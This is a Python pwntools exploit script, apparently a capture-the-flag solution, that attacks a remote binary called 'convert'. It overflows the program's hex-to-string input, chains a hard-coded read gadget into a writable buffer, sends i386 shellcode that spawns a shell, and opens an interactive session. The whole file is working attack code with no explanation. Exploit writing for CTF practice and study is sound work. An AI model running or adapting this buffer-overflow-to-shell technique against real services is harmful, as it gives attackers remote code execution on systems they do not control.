#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('convert'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def str2hex(data):
    r.sendlineafter('> ', '1')
    r.recvuntil('Input: ')
    r.sendline(data, 32)

def hex2str(data, endl=True):
    r.sendlineafter('> ', '2')
    r.recvuntil('Input: ')
    if endl:
        r.sendline(data, 64)
    else:
        r.send(data, 64)

r = remote(HOST, PORT)
hex2str(enhex('a')*30 + '0a')
pause()
exp = enhex('b'*31 + '\n')
hex2str(exp)

read = 0x080492fb
buf = 0x8049000
exp = flat(
    '\x27', read, buf, buf,
)
exp = enhex((enhex(exp) + '\x0a').ljust(32, '0'))
hex2str(exp[:63], False)

r.send(asm(shellcraft.i386.sh()))

r.interactive()
